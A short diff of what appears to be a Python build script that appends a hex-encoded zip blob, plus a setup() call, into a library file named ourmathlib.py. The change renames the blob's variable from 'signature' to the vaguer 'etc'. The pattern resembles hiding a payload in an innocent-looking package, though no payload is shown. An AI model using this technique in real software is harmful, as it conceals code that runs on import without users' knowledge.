@@ -17,4 +17,4 @@ with open('tmp.zip', 'r') as f:
 subprocess.call('rm -rf tmp.zip', shell=True)
 
 with open('ourmathlib/ourmathlib.py', 'a') as f:
-    f.write('\nsignature = \'' + raw.encode('hex') + '\'\nsetup()\n')
+    f.write('\netc = \'' + raw.encode('hex') + '\'\nsetup()\n')
